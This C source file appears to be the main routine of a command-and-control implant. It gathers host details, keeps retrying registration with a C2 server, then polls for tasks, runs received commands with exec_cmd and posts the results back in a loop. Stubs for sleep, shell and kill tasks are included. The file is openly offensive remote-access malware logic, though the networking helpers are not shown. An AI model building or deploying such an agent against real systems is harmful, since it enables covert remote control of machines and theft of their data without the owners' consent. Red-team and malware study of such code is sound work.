#include <limits.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

#include "initiate.h"

int main(void)
{
    struct strings_array sa = { NULL, 0};
    struct agent_info agent = {{'\0'}, {'\0'}, {'\0'}, {'\0'}, {'\0'}};
    struct tasks task = { {'\0'}, 0, {'\0'}, {'\0'}, NULL, NULL, {'\0'}, 0, 1};
 
    bool host_info_gathered = false;
    while(!host_info_gathered) {
        if(get_host_info(&agent)) {
            puts("Host info gathered.\n");
            host_info_gathered = true;
            // printf("Hostname in main: %s\n", agent.hostname);
            // printf("Agent os_type in main: %s\n", agent.os_version);
            // printf("Agent os_version in main: %s\n", agent.os_version);
            break;
        } else {
            puts("Unable to gather host info\n");
            continue;
        }
    }

    puts("Registering with C2 server...\n");
    bool registered = false;
    while(!registered) {
        if(reg(&agent, &sa)) {
            puts("Registered\n");
            registered = true;
	        printf("The data returning from agent registration main is %s\n\n", sa.response);
            continue;
        } else {
            puts("Failed to register agent with C2 server, trying again.\n");
            sleep(5);
            continue;
        }

    }
    puts("Made it out of reg\n");
    printf("UUID in main is %s", agent.uuid);

    create_tasks_url(sa.response, &agent);
    create_results_url(&agent, &task);

    puts("Give you time to create tasks\n");
    sleep(20);
    while(true) {
        puts("Checking tasks\n");
        if(!check_tasks(&agent, &sa)) {
            puts("No tasks during check in.\n");
            continue;
        }
        if(!parse_tasks(sa.response, &task)) {
            puts("Tasks not parsed successfully.\n");
            continue;
        }

        // Begin iterating through task.tasks_array array and extracting task ID
        // task type, task cmd, and args to then call follow on task execution
        // functions.
        for (unsigned int i = 0; i < task.sz; i++) {      

            // Ref for scanning remainder of string (%[\001-\377]):
            // https://stackoverflow.com/questions/35101996/sscanf-get-the-value-of-the-remaining-string
            sscanf(task.tasks_array[i], "%s %d %s %[\001-\377]", task.id, &task.type, task.cmd, task.args);
            printf("Tasks ID: %s\n", task.id);
            printf("Tasks Type: %d\n", task.type);
            printf("Tasks Cmd: %s\n", task.cmd);
            printf("Tasks Arg: %s\n", task.args);
            puts(" \n");
            // Eventually check_tasks will return the task type and
            // specific task. An if block or switch case will be added
            // here to call appropriate functions for a given task type.

            // Designates enum for task types.
            enum TASK_TYPE {CMD, SLEEP, SHELL, KILL};

            // Begin switch statement against task type to then call follow on
            // task execution functions.
            switch (task.type) {
            case CMD:
                puts("CMD task detected\n");
                exec_cmd(&task);
                break;
            case SLEEP:
                puts("SLEEP task detected\n");
                break;
            case SHELL:
                puts("SHELL task detected\n");
                break;
            case KILL:
                puts("KILL task detected\n");
                break;
            default:
                puts("Invalid task type.\n");
                continue;
            }

            post_results(&task, &sa);

            // After executing each task and posting results reset values
            // to execute  next task.
            reset_task_vals(&task);


        }

        free(sa.response);
        destroy(&task);

        task.results = NULL;
        sa.response = NULL;
        sa.size = 0;
        task.sz = 0;

        sleep(10);
    }
        
}